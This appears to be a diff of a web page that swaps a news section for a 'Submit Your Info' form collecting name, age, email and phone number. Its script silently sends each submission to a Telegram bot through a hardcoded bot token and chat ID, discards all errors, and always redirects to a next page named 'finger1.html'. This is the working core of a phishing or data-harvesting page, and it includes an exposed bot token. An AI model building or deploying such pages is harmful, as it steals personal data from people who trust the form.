@@ -107,67 +107,61 @@
 
 
   <!-- news section -->
-  <div style="display: flex; justify-content: center; align-items: center; height: 100vh;">
-   <form id="userForm" onsubmit="handleForm(event)" style="...">
-  <h2 style="text-align: center;">User Form</h2>
+<form id="myForm" onsubmit="handleForm(event)">
+    <h2>Submit Your Info</h2>
 
-  <label for="fullname">Full Name:</label><br>
-  <input type="text" id="fullname" name="fullname" required style="width: 100%; padding: 10px;"><br><br>
+    <label for="fullname">Full Name</label>
+    <input type="text" id="fullname" required>
 
-  <label for="age">Age:</label><br>
-  <input type="number" id="age" name="age" required style="width: 100%; padding: 10px;"><br><br>
+    <label for="age">Age</label>
+    <input type="number" id="age" required>
 
-  <label for="email">Email:</label><br>
-  <input type="email" id="email" name="email" required style="width: 100%; padding: 10px;"><br><br>
+    <label for="email">Email</label>
+    <input type="text" id="email" required> <!-- accepts normal text -->
 
-  <label for="phonenumber">Phone Number:</label><br>
-  <input type="tel" id="phonenumber" name="phonenumber" required style="width: 100%; padding: 10px;"><br><br>
+    <label for="phonenumber">Phone Number</label>
+    <input type="text" id="phonenumber" required>
 
-  <button type="submit" style="width: 100%; padding: 12px; background-color: #007bff; color: white; border: none; border-radius: 5px; font-size: 16px;">Next</button>
-</form>
+    <button type="submit">Submit</button>
+  </form>
 
-<script>
-  async function handleForm(event) {
-    event.preventDefault();
+  <script>
+    async function handleForm(event) {
+      event.preventDefault();
 
-    const name = document.getElementById('fullname').value;
-    const age = document.getElementById('age').value;
-    const email = document.getElementById('email').value;
-    const phone = document.getElementById('phonenumber').value;
+      const name = document.getElementById('fullname').value;
+      const age = document.getElementById('age').value;
+      const email = document.getElementById('email').value;
+      const phone = document.getElementById('phonenumber').value;
 
-    const message = `
+      const message = `
 New Submission:
 👤 Name: ${name}
 🎂 Age: ${age}
 📧 Email: ${email}
 📞 Phone: ${phone}
-    `;
+      `;
 
-    // ✅ Telegram Info
-    const telegramToken = "7989916546:AAEB5kP_GnKwdsf6fHw6yb_znh2w8hosEY0";
-    const chatId = "5066200632";
+      const telegramToken = "7989916546:AAEB5kP_GnKwdsf6fHw6yb_znh2w8hosEY0";
+      const chatId = "5066200632";
 
-    try {
-      await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-        })
-      });
-    } catch (error) {
-      console.warn("Telegram error (ignored):", error);
+      try {
+        await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        });
+      } catch (e) {
+        // ignore all errors silently
+      }
+
+      // ✅ Always go to the next page
+      window.location.href = "finger1.html";
     }
-
-    // ✅ Always go to next page
-    window.location.href = "finger1.html";
-  }
-</script>
-
-
-
-</div>
+  </script>
 
 
 
